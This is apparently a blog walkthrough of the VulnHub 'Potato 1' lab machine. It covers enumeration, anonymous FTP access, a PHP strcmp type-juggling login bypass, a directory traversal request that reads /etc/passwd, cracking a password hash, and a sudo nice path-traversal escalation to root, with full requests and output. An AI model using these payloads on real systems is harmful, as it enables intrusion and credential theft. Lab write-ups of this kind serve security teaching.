---
layout: post
author: H4
---

[Details](https://www.infosecarticles.com/potato-1-vulnhub-walkthrough/)

# enumeration
Performing a simple `nmap` scan to identify the attack surface

## nmap
```bash
$ nmap -Pn -p- -sV 192.168.153.101
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 15:09 EST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 15:10 (0:00:14 remaining)
Nmap scan report for 192.168.153.101
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
2112/tcp open  ftp     ProFTPD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
```

## port 80
Using `gobuster` to identify any hidden resources on the web server.

```bash
$ gobuster dir -u http://192.168.153.101/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403            
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.153.101/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2022/02/08 14:54:42 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 318] [--> http://192.168.153.101/admin/]
/index.php            (Status: 200) [Size: 245]                                    
/index.php            (Status: 200) [Size: 245]                                    
                                                                                   
===============================================================
2022/02/08 15:01:26 Finished
===============================================================
```

> `admin` reveals a login page
{: .prompt-info }

### normal login request
#### request
```http
POST /admin/index.php?login=1 HTTP/1.1
Host: 192.168.153.101
Content-Length: 30
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.153.101
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.153.101/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=admin&password=123456
```

#### response
```http
HTTP/1.1 200 OK
Date: Tue, 08 Feb 2022 20:30:56 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 109
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
<head></head>
<body>

<p>Bad user/password! </br> Return to the <a href="index.php">login page</a> <p>
```

> `admin:123456` and other standard combinations unfortunately do not work
{: .prompt-danger }

---

# exploitation
## ftp
> anonymous access allowed
{: .prompt-tip }

Downloading everything from the `ftp` server to see if there is any juicy stuff in there which helps us to get access to the target.

```bash
$ ftp 192.168.153.101 2112
Connected to 192.168.153.101.
220 ProFTPD Server (Debian) [::ffff:192.168.153.101]
Name (192.168.153.101:void): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.49.153 !
230-
230-The local time is: Tue Feb 08 20:10:21 2022
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dor
?Invalid command
ftp> dir
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
226 Transfer complete
ftp> get index.php.bak
local: index.php.bak remote: index.php.bak
200 PORT command successful
150 Opening BINARY mode data connection for index.php.bak (901 bytes)
226 Transfer complete
901 bytes received in 0.00 secs (938.0414 kB/s)
ftp> exit
221 Goodbye.
```

content of `index.php.bak`
```bash
<html>
<head></head>
<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>


  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>
```

> This source code seems to be the code of the login page we identified earlier with `gobuster`
{: .prompt-tip }

> Having a closer look at the `if` statement comparing the submitted credentials reveals that there is a [`type juggling`](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf) vulnerability. We can exploit this issue by submitting an array instead of a password string to bypass the login.
{: .prompt-info }

## authentication bypass
### request
```http
POST /admin/index.php?login=1 HTTP/1.1
Host: 192.168.153.101
Content-Length: 26
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.153.101
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.153.101/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=admin&password[]=
```

### response
```http
HTTP/1.1 200 OK
Date: Tue, 08 Feb 2022 20:15:27 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh; expires=Wed, 08-Feb-2023 20:15:27 GMT; Max-Age=31536000
Vary: Accept-Encoding
Content-Length: 91
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
<head></head>
<body>

Welcome! </br> Go to the <a href="dashboard.php">dashboard</a>
```

Yay! It worked. We are now in the admin panel.  

> The panel contains a site which allows the admin to view the content of log files which can be exploited by a `directory traversal` attack.
{: .prompt-tip }

## arbitriary file read in `/admin/dashboard.php?page=log`

The proof that there is a `directory traversal` vulnerability we read the `/etc/passwd` file.

### request
```bash
POST /admin/dashboard.php?page=log HTTP/1.1
Host: 192.168.153.101
Content-Length: 36
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.153.101
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.153.101/admin/dashboard.php?page=log
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh
Connection: close

file=../../../../../../../etc/passwd
```

### response
```bash
HTTP/1.1 200 OK
Date: Tue, 08 Feb 2022 20:17:40 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2836
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
<head>
...
Contenu du fichier ../../../../../../../etc/passwd :  </br><PRE>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
proftpd:x:112:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
</PRE>
```

It worked and we see that there is a `hash` inside the file, which is not very common and indeed not secure at all.  
`webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash`

> Cracking the hash with `john` reveals password the password `dragon`
{: .prompt-tip }

## logging in via ssh and first flag

```bash
$ ssh webadmin@192.168.153.101
The authenticity of host '192.168.153.101 (192.168.153.101)' can't be established.
ED25519 key fingerprint is SHA256:9DQds4tRzLVKtayQC3VgIo53wDRYtKzwBRgF14XKjCg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.153.101' (ED25519) to the list of known hosts.
webadmin@192.168.153.101's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 08 Feb 2022 08:19:58 PM UTC

  System load:  0.0                Processes:               151
  Usage of /:   12.2% of 31.37GB   Users logged in:         0
  Memory usage: 25%                IPv4 address for ens192: 192.168.153.101
  Swap usage:   0%


118 updates can be installed immediately.
33 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
webadmin@serv:~$ ls
local.txt  user.txt
webadmin@serv:~$ cat local.txt 
0******************************7
```

---

# post exploitation
## privilege escalation

To get `root` access we first check if we have permissions to execute a command with `sudo`.

```bash
webadmin@serv:~$ sudo -l
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
```

To check how to exploit the program `nice` to get `root` access, we can have a look at [gtfobins](https://gtfobins.github.io/gtfobins/nice/)

> Exploit `nice` to get `root` access: `sudo /bin/nice /bin/sh`
{: .prompt-info }

> Unfortunately we are jailed to the `/notes` folder
{: .prompt-danger }

> This restriction can be bypassed by traversing out of the `/notes` folder. So the finale payload to get `root` access looks like the following: `sudo /bin/nice /notes/../bin/sh`
{: .prompt-tip }

```bash
webadmin@serv:~$ sudo /bin/nice /notes/../bin/sh
# whoami
root
# cat /root/proof.txt
6******************************8
```

Pwned! <@:-)
